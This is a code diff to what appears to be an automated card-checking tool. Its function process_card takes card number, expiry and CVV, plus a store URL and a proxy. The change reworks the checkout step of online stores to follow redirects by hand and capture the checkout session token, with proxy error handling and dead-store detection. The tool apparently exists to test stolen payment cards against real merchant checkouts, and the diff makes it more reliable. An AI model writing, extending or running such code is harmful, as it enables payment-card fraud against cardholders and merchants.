@@ -677,20 +677,66 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, f"Cart failed with status {status}", gateway, total_price, currency, proxy_ok
 
             checkout_headers = {**headers, 'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8'}
+            sst = None
+            text = ''
+            checkout_url = ourl + '/checkout'
             try:
                 response = await session.post(
                     url=ourl + '/checkout',
-                    allow_redirects=True,
+                    allow_redirects=False,
                     headers=checkout_headers,
                     proxy=proxy_url,
                     timeout=10,
                 )
+                sst = response.headers.get('X-Checkout-One-Session-Token')
+                final_url = ourl + '/checkout'
+                hops = 0
+                while response.status in (301, 302, 303, 307, 308) and hops < 8:
+                    loc = response.headers.get('Location')
+                    await response.release()
+                    if not loc:
+                        break
+                    if loc.startswith('/'):
+                        loc = f"https://{urlparse(ourl).netloc}{loc}"
+                    final_url = loc
+                    response = await session.post(
+                        url=loc,
+                        allow_redirects=False,
+                        headers=checkout_headers,
+                        proxy=proxy_url,
+                        timeout=10,
+                    )
+                    hop_sst = response.headers.get('X-Checkout-One-Session-Token')
+                    if hop_sst:
+                        sst = hop_sst
+                    hops += 1
+
+                text = await response.text()
+                checkout_url = final_url if response.status in (301, 302, 303, 307, 308) else str(response.url)
+                await response.release()
+
+                if not text or len(text) < 500 or not sst:
+                    async with session.get(
+                        final_url,
+                        headers=checkout_headers,
+                        proxy=proxy_url,
+                        timeout=10,
+                    ) as get_resp:
+                        get_text = await get_resp.text()
+                        get_sst = get_resp.headers.get('X-Checkout-One-Session-Token')
+                        if get_sst:
+                            sst = get_sst
+                        if get_text and len(get_text) > len(text or ''):
+                            text = get_text
+                            checkout_url = str(get_resp.url)
+                        elif not text:
+                            text = get_text
+                            checkout_url = str(get_resp.url)
             except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                 proxy_ok = False
                 return False, f"Checkout proxy error: {str(e)}", gateway, total_price, currency, proxy_ok
 
-            checkout_url = str(response.url)
-            text = await response.text()
+            logger.info(f"checkout url={checkout_url} sst={'yes' if sst else 'no'} text_len={len(text or '')}")
 
             if is_dead_store(text):
                 return False, "DEAD_STORE", gateway, total_price, currency, proxy_ok
@@ -701,7 +747,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             attempt_token = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
             attempt_token = attempt_token.group(1) if attempt_token else checkout_url.split('/')[-1].split('?')[0]
 
-            sst = response.headers.get('X-Checkout-One-Session-Token')
             if not sst:
                 parsed = urlparse(checkout_url)
                 r_param = parse_qs(parsed.query).get('_r', [None])[0]
